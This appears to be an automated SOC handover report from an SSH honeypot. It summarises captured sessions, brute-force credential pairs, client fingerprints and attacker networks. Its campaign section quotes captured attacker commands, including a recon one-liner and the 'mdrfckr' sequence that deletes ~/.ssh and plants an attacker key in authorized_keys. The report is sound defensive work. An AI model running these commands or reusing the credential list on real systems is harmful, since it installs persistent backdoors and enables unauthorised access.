# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-03 |
| **Generated At** | 2026-09-03T14:17:08Z |
| **Shift Time** | 14:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **584** |
| Confirmed Threats | **559** |
| False Positives Filtered | **25** (4.3%) |
| Unique Attacker IPs | **84** |
| Countries of Origin | **36** |
| High Severity Cases | **279** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **305** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **326** |
| Unique Credential Pairs | **249** |
| Unique Usernames | **78** |
| Unique Passwords | **152** |
| Successful Auth Pairs | **276** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 72 |
| `345gs5662d34` | 24 |
| `admin` | 23 |
| `user` | 16 |
| `support` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `` | 18 |
| `support` | 12 |
| `1234` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `support` | `support` | 12 |
| `root` | `3245gs5662d34` | 8 |
| `pi` | `abcd1234` | 6 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `Admin123!` | `217.60.255.130` | 2026-09-03T06:55:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.211.65` | 2026-09-03T06:56:33 |
| `root` | `Alireza1234` | `217.60.255.130` | 2026-09-03T07:01:20 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-03T07:01:26 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.24.95` | 2026-09-03T07:02:22 |
| `*1` | `$4` | `34.62.24.95` | 2026-09-03T07:02:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4504` | `34.62.24.95` | 2026-09-03T07:02:33 |
| `admin` | `admin786` | `217.60.255.130` | 2026-09-03T07:05:30 |
| `support` | `support` | `10.0.0.73` | 2026-09-03T07:08:26 |
| `root` | `Kambiz1234` | `217.60.255.130` | 2026-09-03T07:11:53 |
| `user` | `qwerty@12345` | `217.60.255.130` | 2026-09-03T07:14:55 |
| `root` | `host123` | `217.60.255.130` | 2026-09-03T07:22:40 |
| `sysadmin` | `123!@#` | `217.60.255.130` | 2026-09-03T07:24:24 |
| `root` | `Hadi1234` | `217.60.255.130` | 2026-09-03T07:33:26 |
| `user` | `User2025` | `217.60.255.130` | 2026-09-03T07:33:58 |
| `user` | `1234` | `217.60.255.130` | 2026-09-03T07:43:24 |
| `root` | `Admin2023` | `217.60.255.130` | 2026-09-03T07:44:03 |
| `admin` | `admin` | `35.205.247.108` | 2026-09-03T07:44:52 |
| `support` | `support` | `176.53.159.196` | 2026-09-03T07:49:00 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-03T07:51:30 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-03T07:51:30 |
| `user` | `Pass1234` | `217.60.255.130` | 2026-09-03T07:53:00 |
| `root` | `Athul@123` | `217.60.255.130` | 2026-09-03T07:54:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.153.57` | 2026-09-03T07:55:10 |
| `*1` | `$4` | `207.175.153.57` | 2026-09-03T07:55:23 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9957` | `207.175.153.57` | 2026-09-03T07:55:25 |
| `zy` | `1` | `10.0.0.73` | 2026-09-03T07:58:21 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-03T07:58:25 |
| `zy` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T07:58:28 |
| `ftpuser` | `123123` | `31.56.146.239` | 2026-09-03T07:58:42 |
| `345gs5662d34` | `345gs5662d34` | `31.56.146.239` | 2026-09-03T07:58:48 |
| `ftpuser` | `3245gs5662d34` | `31.56.146.239` | 2026-09-03T07:58:50 |
| `root` | `314159265` | `10.0.0.73` | 2026-09-03T07:58:58 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T07:59:02 |
| `book` | `book` | `10.0.0.73` | 2026-09-03T07:59:32 |
| `book` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T07:59:38 |
| `radius` | `radius` | `10.0.0.73` | 2026-09-03T08:02:02 |
| `radius` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T08:02:07 |
| `test` | `test#123` | `217.60.255.130` | 2026-09-03T08:02:32 |
| `root` | `Ahir@123` | `217.60.255.130` | 2026-09-03T08:05:31 |
| `bla` | `bla` | `10.0.0.73` | 2026-09-03T08:05:56 |
| `bla` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T08:06:00 |
| `hh` | `hh` | `10.0.0.73` | 2026-09-03T08:06:11 |
| `hh` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T08:06:15 |
| `root` | `` | `209.99.186.128` | 2026-09-03T08:07:53 |
| `root` | `beyond` | `171.25.158.87` | 2026-09-03T08:08:06 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.87` | 2026-09-03T08:08:09 |
| `root` | `3245gs5662d34` | `171.25.158.87` | 2026-09-03T08:08:10 |
| `loginuser` | `P@ssw0rd` | `175.118.127.138` | 2026-09-03T08:09:26 |
| `345gs5662d34` | `345gs5662d34` | `175.118.127.138` | 2026-09-03T08:09:30 |
| `loginuser` | `3245gs5662d34` | `175.118.127.138` | 2026-09-03T08:09:31 |
| `fastuser` | `123456` | `79.101.53.18` | 2026-09-03T08:10:28 |
| `345gs5662d34` | `345gs5662d34` | `79.101.53.18` | 2026-09-03T08:10:31 |
| `fastuser` | `3245gs5662d34` | `79.101.53.18` | 2026-09-03T08:10:31 |
| `nginx` | `nginx#123` | `217.60.255.130` | 2026-09-03T08:11:56 |
| `root` | `Rishu@123` | `217.60.255.130` | 2026-09-03T08:16:21 |
| `admin` | `Password@123` | `217.60.255.130` | 2026-09-03T08:21:36 |
| `root` | `Himanshu@123` | `217.60.255.130` | 2026-09-03T08:27:14 |
| `user` | `admin@1234` | `217.60.255.130` | 2026-09-03T08:31:11 |
| `sasan` | `sasan` | `10.0.0.73` | 2026-09-03T08:31:11 |
| `sasan` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T08:31:14 |
| `root` | `Tata@123` | `217.60.255.130` | 2026-09-03T08:37:48 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.161.246` | 2026-09-03T08:38:33 |
| `*1` | `$4` | `34.53.161.246` | 2026-09-03T08:38:47 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1750` | `34.53.161.246` | 2026-09-03T08:38:49 |
| `ftp` | `123123` | `217.60.255.130` | 2026-09-03T08:40:32 |
| `root` | `Arshia123` | `217.60.255.130` | 2026-09-03T08:48:37 |
| `postgres` | `postgres@2025` | `217.60.255.130` | 2026-09-03T08:50:09 |
| `root` | `qwerty@123456` | `10.0.0.73` | 2026-09-03T08:53:56 |
| `root` | `Abbasi@123` | `217.60.255.130` | 2026-09-03T08:59:28 |
| `odoo` | `odoo@123` | `217.60.255.130` | 2026-09-03T08:59:42 |
| `weblogic` | `weblogic@123` | `217.60.255.130` | 2026-09-03T09:09:07 |
| `root` | `Sunrise@123` | `217.60.255.130` | 2026-09-03T09:10:08 |
| `jenkins` | `jenkins#123` | `217.60.255.130` | 2026-09-03T09:18:43 |
| `root` | `admin` | `64.121.66.69` | 2026-09-03T09:20:45 |
| `root` | `Anuj@123` | `217.60.255.130` | 2026-09-03T09:20:53 |
| `rodrigo` | `123456` | `181.62.56.67` | 2026-09-03T09:24:43 |
| `345gs5662d34` | `345gs5662d34` | `181.62.56.67` | 2026-09-03T09:24:45 |
| `rodrigo` | `3245gs5662d34` | `181.62.56.67` | 2026-09-03T09:24:45 |
| `ubnt` | `ubnt` | `94.154.43.73` | 2026-09-03T09:26:45 |
| `vyos` | `vyos` | `94.154.43.73` | 2026-09-03T09:26:47 |
| `root` | `` | `94.154.43.73` | 2026-09-03T09:26:48 |
| `admin` | `admin` | `94.154.43.73` | 2026-09-03T09:26:49 |
| `admin` | `pfsense` | `94.154.43.73` | 2026-09-03T09:26:50 |
| `root` | `opnsense` | `94.154.43.73` | 2026-09-03T09:26:52 |
| `root` | `admin` | `94.154.43.73` | 2026-09-03T09:26:53 |
| `admin` | `1234` | `94.154.43.73` | 2026-09-03T09:26:55 |
| `root` | `password` | `94.154.43.73` | 2026-09-03T09:26:56 |
| `julian` | `123` | `150.5.154.160` | 2026-09-03T09:26:57 |
| `root` | `abcd1234` | `94.154.43.73` | 2026-09-03T09:26:58 |
| `admin` | `moxa` | `94.154.43.73` | 2026-09-03T09:27:00 |
| `94jo3dkru4` | `moaxiwroot` | `94.154.43.73` | 2026-09-03T09:27:01 |
| `345gs5662d34` | `345gs5662d34` | `150.5.154.160` | 2026-09-03T09:27:02 |
| `default` | `default` | `94.154.43.73` | 2026-09-03T09:27:02 |
| `raspberry` | `pi` | `94.154.43.73` | 2026-09-03T09:27:04 |
| `julian` | `3245gs5662d34` | `150.5.154.160` | 2026-09-03T09:27:04 |
| `pi` | `raspberry` | `94.154.43.73` | 2026-09-03T09:27:05 |
| `freebsd` | `freebsd` | `94.154.43.73` | 2026-09-03T09:27:06 |
| `server` | `server@123` | `217.60.255.130` | 2026-09-03T09:28:16 |
| `root` | `Karthi@123` | `217.60.255.130` | 2026-09-03T09:31:29 |
| `appuser` | `appuser@123` | `217.60.255.130` | 2026-09-03T09:37:38 |
| `root` | `Nazim@123` | `217.60.255.130` | 2026-09-03T09:42:19 |
| `root` | `Yc123456` | `10.0.0.73` | 2026-09-03T09:47:12 |
| `sysadmin` | `admin@123` | `217.60.255.130` | 2026-09-03T09:47:12 |
| `testa` | `123456` | `10.0.0.73` | 2026-09-03T09:48:32 |
| `testa` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T09:48:37 |
| `root` | `admin` | `192.42.116.55` | 2026-09-03T09:50:21 |
| `access` | `access` | `10.0.0.73` | 2026-09-03T09:51:52 |
| `access` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T09:51:58 |
| `root` | `Asc@123` | `217.60.255.130` | 2026-09-03T09:52:59 |
| `bhanu` | `bhanu` | `10.0.0.73` | 2026-09-03T09:53:39 |
| `bhanu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T09:53:43 |
| `debian` | `debian@123` | `217.60.255.130` | 2026-09-03T09:56:39 |
| `root` | `Hassan123` | `217.60.255.130` | 2026-09-03T10:03:39 |
| `oracle` | `oracle#123` | `217.60.255.130` | 2026-09-03T10:06:04 |
| `root` | `Ela12345` | `217.60.255.130` | 2026-09-03T10:14:32 |
| `zabbix` | `zabbix@123` | `217.60.255.130` | 2026-09-03T10:15:44 |
| `root` | `Chen123456` | `165.154.23.187` | 2026-09-03T10:22:45 |
| `345gs5662d34` | `345gs5662d34` | `165.154.23.187` | 2026-09-03T10:22:50 |
| `root` | `3245gs5662d34` | `165.154.23.187` | 2026-09-03T10:22:51 |
| `oracle` | `password` | `217.60.255.130` | 2026-09-03T10:25:07 |
| `root` | `Qazwsxedc123` | `217.60.255.130` | 2026-09-03T10:25:09 |
| `root` | `1234567890` | `92.118.39.77` | 2026-09-03T10:25:23 |
| `root` | `password1` | `92.118.39.77` | 2026-09-03T10:26:36 |
| `root` | `admin123` | `92.118.39.77` | 2026-09-03T10:27:50 |
| `root` | `1234` | `92.118.39.77` | 2026-09-03T10:29:02 |
| `root` | `Azerty123` | `112.151.168.124` | 2026-09-03T10:30:11 |
| `root` | `123` | `92.118.39.77` | 2026-09-03T10:30:14 |
| `345gs5662d34` | `345gs5662d34` | `112.151.168.124` | 2026-09-03T10:30:15 |
| `root` | `3245gs5662d34` | `112.151.168.124` | 2026-09-03T10:30:17 |
| `root` | `qwerty123` | `92.118.39.77` | 2026-09-03T10:31:24 |
| `root` | `centos7svm` | `147.50.231.135` | 2026-09-03T10:32:20 |
| `345gs5662d34` | `345gs5662d34` | `147.50.231.135` | 2026-09-03T10:32:24 |
| `root` | `3245gs5662d34` | `147.50.231.135` | 2026-09-03T10:32:26 |
| `root` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T10:32:32 |
| `root` | `pass123` | `92.118.39.77` | 2026-09-03T10:33:40 |
| `admin` | `dell123` | `217.60.255.130` | 2026-09-03T10:34:33 |
| `root` | `123abc` | `92.118.39.77` | 2026-09-03T10:34:47 |
| `root` | `Welcome123` | `217.60.255.130` | 2026-09-03T10:35:44 |
| `admin` | `1234567890` | `92.118.39.77` | 2026-09-03T10:35:54 |
| `admin` | `password1` | `92.118.39.77` | 2026-09-03T10:37:02 |
| `admin` | `admin123` | `92.118.39.77` | 2026-09-03T10:38:12 |
| `admin` | `1234` | `92.118.39.77` | 2026-09-03T10:39:22 |
| `admin` | `123` | `92.118.39.77` | 2026-09-03T10:40:32 |
| `admin` | `qwerty123` | `92.118.39.77` | 2026-09-03T10:41:45 |
| `admin` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T10:42:58 |
| `kafka` | `kafka#123` | `217.60.255.130` | 2026-09-03T10:44:06 |
| `admin` | `pass123` | `92.118.39.77` | 2026-09-03T10:44:11 |
| `admin` | `123abc` | `92.118.39.77` | 2026-09-03T10:45:21 |
| `test` | `1234567890` | `92.118.39.77` | 2026-09-03T10:46:25 |
| `root` | `Bsnl@123` | `217.60.255.130` | 2026-09-03T10:46:33 |
| `test` | `password1` | `92.118.39.77` | 2026-09-03T10:47:31 |
| `test` | `admin123` | `92.118.39.77` | 2026-09-03T10:48:37 |
| `test` | `1234` | `92.118.39.77` | 2026-09-03T10:49:46 |
| `test` | `123` | `92.118.39.77` | 2026-09-03T10:51:02 |
| `test` | `qwerty123` | `92.118.39.77` | 2026-09-03T10:52:20 |
| `test` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T10:53:32 |
| `admin` | `Passw0rd@123` | `217.60.255.130` | 2026-09-03T10:53:37 |
| `test` | `pass123` | `92.118.39.77` | 2026-09-03T10:54:46 |
| `test` | `123abc` | `92.118.39.77` | 2026-09-03T10:55:59 |
| `root` | `QWEasdZXC@123` | `217.60.255.130` | 2026-09-03T10:57:11 |
| `user` | `1234567890` | `92.118.39.77` | 2026-09-03T10:57:12 |
| `user` | `password1` | `92.118.39.77` | 2026-09-03T10:58:21 |
| `user` | `admin123` | `92.118.39.77` | 2026-09-03T10:59:27 |
| `user` | `1234` | `92.118.39.77` | 2026-09-03T11:00:33 |
| `user` | `123` | `92.118.39.77` | 2026-09-03T11:01:39 |
| `user` | `qwerty123` | `92.118.39.77` | 2026-09-03T11:02:51 |
| `user` | `Qwerty@12345` | `217.60.255.130` | 2026-09-03T11:03:04 |
| `user` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T11:04:11 |
| `user` | `pass123` | `92.118.39.77` | 2026-09-03T11:05:36 |
| `user` | `123abc` | `92.118.39.77` | 2026-09-03T11:06:49 |
| `ubuntu` | `1234567890` | `92.118.39.77` | 2026-09-03T11:07:57 |
| `root` | `Maziar123` | `217.60.255.130` | 2026-09-03T11:08:06 |
| `ubuntu` | `password1` | `92.118.39.77` | 2026-09-03T11:09:05 |
| `ubuntu` | `admin123` | `92.118.39.77` | 2026-09-03T11:10:17 |
| `ubuntu` | `1234` | `92.118.39.77` | 2026-09-03T11:11:30 |
| `admin` | `Password@12345` | `217.60.255.130` | 2026-09-03T11:12:44 |
| `ubuntu` | `123` | `92.118.39.77` | 2026-09-03T11:12:46 |
| `ubuntu` | `qwerty123` | `92.118.39.77` | 2026-09-03T11:14:12 |
| `ubuntu` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T11:15:22 |
| `ubuntu` | `pass123` | `92.118.39.77` | 2026-09-03T11:16:26 |
| `ubuntu` | `123abc` | `92.118.39.77` | 2026-09-03T11:17:32 |
| `guest` | `1234567890` | `92.118.39.77` | 2026-09-03T11:18:42 |
| `root` | `P@33w0rd` | `217.60.255.130` | 2026-09-03T11:18:48 |
| `guest` | `password1` | `92.118.39.77` | 2026-09-03T11:19:48 |
| `guest` | `admin123` | `92.118.39.77` | 2026-09-03T11:20:57 |
| `guest` | `1234` | `92.118.39.77` | 2026-09-03T11:22:07 |
| `sysadmin` | `123!@#123` | `217.60.255.130` | 2026-09-03T11:22:10 |
| `guest` | `123` | `92.118.39.77` | 2026-09-03T11:23:23 |
| `guest` | `qwerty123` | `92.118.39.77` | 2026-09-03T11:24:41 |
| `guest` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T11:26:01 |
| `guest` | `pass123` | `92.118.39.77` | 2026-09-03T11:27:27 |
| `guest` | `123abc` | `92.118.39.77` | 2026-09-03T11:28:39 |
| `root` | `Yusuf123` | `217.60.255.130` | 2026-09-03T11:29:29 |
| `oracle` | `1234567890` | `92.118.39.77` | 2026-09-03T11:29:43 |
| `oracle` | `password1` | `92.118.39.77` | 2026-09-03T11:30:51 |
| `sysadmin` | `1qaz!QAZ` | `217.60.255.130` | 2026-09-03T11:31:44 |
| `oracle` | `admin123` | `92.118.39.77` | 2026-09-03T11:32:00 |
| `oracle` | `1234` | `92.118.39.77` | 2026-09-03T11:33:13 |
| `oracle` | `123` | `92.118.39.77` | 2026-09-03T11:34:34 |
| `oracle` | `qwerty123` | `92.118.39.77` | 2026-09-03T11:36:01 |
| `oracle` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T11:37:31 |
| `oracle` | `pass123` | `92.118.39.77` | 2026-09-03T11:38:48 |
| `oracle` | `123abc` | `92.118.39.77` | 2026-09-03T11:39:56 |
| `sol` | `sol` | `2.57.122.238` | 2026-09-03T11:40:30 |
| `root` | `Alperen123` | `217.60.255.130` | 2026-09-03T11:40:32 |
| `postgres` | `1234567890` | `92.118.39.77` | 2026-09-03T11:41:07 |
| `sysadmin` | `123qwe!@#QWE` | `217.60.255.130` | 2026-09-03T11:41:28 |
| `solana` | `solana` | `2.57.122.238` | 2026-09-03T11:42:14 |
| `postgres` | `password1` | `92.118.39.77` | 2026-09-03T11:42:23 |
| `postgres` | `admin123` | `92.118.39.77` | 2026-09-03T11:43:40 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-09-03T11:43:57 |
| `postgres` | `1234` | `92.118.39.77` | 2026-09-03T11:45:05 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-09-03T11:45:35 |
| `postgres` | `123` | `92.118.39.77` | 2026-09-03T11:46:33 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-09-03T11:47:08 |
| `postgres` | `qwerty123` | `92.118.39.77` | 2026-09-03T11:48:05 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-09-03T11:48:45 |
| `postgres` | `1q2w3e4r` | `92.118.39.77` | 2026-09-03T11:49:17 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-09-03T11:50:20 |
| `sysadmin` | `1234qwer!@#$QWER` | `217.60.255.130` | 2026-09-03T11:51:08 |
| `root` | `Furkan123` | `217.60.255.130` | 2026-09-03T11:51:25 |
| `node` | `node` | `2.57.122.238` | 2026-09-03T11:51:51 |
| `node` | `1234` | `2.57.122.238` | 2026-09-03T11:53:24 |
| `GET / HTTP/1.0` | `` | `45.33.50.24` | 2026-09-03T11:53:31 |
| `OPTIONS / HTTP/1.0` | `` | `45.33.50.24` | 2026-09-03T11:53:36 |
| `OPTIONS / RTSP/1.0` | `` | `45.33.50.24` | 2026-09-03T11:53:41 |
| `GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0` | `` | `45.33.50.24` | 2026-09-03T11:54:29 |
| `b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00'` | ` ` | `45.33.50.24` | 2026-09-03T11:54:39 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `45.33.50.24` | 2026-09-03T11:54:49 |
| `node` | `123456` | `2.57.122.238` | 2026-09-03T11:55:01 |
| `GET /devicedesc.xml HTTP/1.1` | `` | `45.33.50.24` | 2026-09-03T11:55:38 |
| `CONNECT` | `accept-version:1.2` | `45.33.50.24` | 2026-09-03T11:55:44 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-09-03T11:56:43 |
| `eth` | `eth` | `2.57.122.238` | 2026-09-03T11:58:21 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-09-03T12:00:01 |
| `user` | `User@123` | `217.60.255.130` | 2026-09-03T12:00:43 |
| `tron` | `tron` | `2.57.122.238` | 2026-09-03T12:01:40 |
| `root` | `Bozkurt2025` | `217.60.255.130` | 2026-09-03T12:02:23 |
| `trx` | `trx` | `2.57.122.238` | 2026-09-03T12:03:16 |
| `root` | `Lw123456` | `136.248.242.166` | 2026-09-03T12:04:45 |
| `345gs5662d34` | `345gs5662d34` | `136.248.242.166` | 2026-09-03T12:04:47 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-09-03T12:04:48 |
| `root` | `3245gs5662d34` | `136.248.242.166` | 2026-09-03T12:04:48 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-09-03T12:06:23 |
| `demo` | `demo123` | `172.185.24.228` | 2026-09-03T12:06:59 |
| `345gs5662d34` | `345gs5662d34` | `172.185.24.228` | 2026-09-03T12:07:01 |
| `demo` | `3245gs5662d34` | `172.185.24.228` | 2026-09-03T12:07:01 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-09-03T12:08:02 |
| `solv` | `solv` | `2.57.122.238` | 2026-09-03T12:09:41 |
| `Admin` | `Admin@123` | `217.60.255.130` | 2026-09-03T12:10:23 |
| `solv` | `1234` | `2.57.122.238` | 2026-09-03T12:11:20 |
| `solv` | `123456` | `2.57.122.238` | 2026-09-03T12:13:03 |
| `root` | `Ozturk123` | `217.60.255.130` | 2026-09-03T12:13:08 |
| `solv` | `12345678` | `2.57.122.238` | 2026-09-03T12:14:47 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-09-03T12:19:32 |
| `admin` | `admin1` | `217.60.255.130` | 2026-09-03T12:19:51 |
| `validator` | `validator` | `2.57.122.238` | 2026-09-03T12:21:12 |
| `sol` | `sol123` | `2.57.122.238` | 2026-09-03T12:22:50 |
| `root` | `Yunus2025` | `217.60.255.130` | 2026-09-03T12:23:59 |
| `sol` | `123` | `2.57.122.238` | 2026-09-03T12:24:28 |
| `sol` | `12345678` | `2.57.122.238` | 2026-09-03T12:26:13 |
| `abd` | `abd123` | `164.52.105.37` | 2026-09-03T12:27:46 |
| `345gs5662d34` | `345gs5662d34` | `164.52.105.37` | 2026-09-03T12:27:51 |
| `abd` | `3245gs5662d34` | `164.52.105.37` | 2026-09-03T12:27:53 |
| `trading` | `trading` | `2.57.122.238` | 2026-09-03T12:27:58 |
| `admin` | `P@ssw0rd123!@#` | `217.60.255.130` | 2026-09-03T12:29:34 |
| `trader` | `trader` | `2.57.122.238` | 2026-09-03T12:29:37 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-09-03T12:31:12 |
| `bot` | `bot` | `2.57.122.238` | 2026-09-03T12:32:51 |
| `bot` | `123456` | `2.57.122.238` | 2026-09-03T12:34:31 |
| `root` | `Fuckyou123` | `217.60.255.130` | 2026-09-03T12:34:56 |
| `bot` | `12345` | `2.57.122.238` | 2026-09-03T12:36:09 |
| `1234` | `%PlsASSWORD%` | `217.60.255.130` | 2026-09-03T12:39:14 |
| `root` | `Password999` | `217.60.255.130` | 2026-09-03T12:45:34 |
| `admin` | `admin12345` | `217.60.255.130` | 2026-09-03T12:48:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **584** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 131 |
| libssh | 113 |
| Nmap scanner | 21 |
| OpenSSH | 20 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 71 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 70 | 1 |
| `16443846184e...` | Generic scanner | 51 | 2 |
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `e788c657d1a2...` | Mirai/variant | 19 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 71 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 70 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 51 | 2 | Generic scanner |
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 19 | 3 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 17 | 7 | — |
| `03a80b21afa8...` | libssh | 8 | 4 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 70 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `209.99.186.128`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.5.154.160`, `31.56.146.239`, `171.25.158.87`, `112.151.168.124`, `147.50.231.135`, `172.185.24.228`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **84** |
| Unique ASNs | **53** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS25369` | Hydra Communications Ltd | 3 | HIGH |
| `AS50257` | JV A-Mobile Ltd. | 2 | HIGH |
| `AS10617` | SION S.A | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (278)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bcdff129accc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 06:55 |
| **Last Seen** | 2026-09-03 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
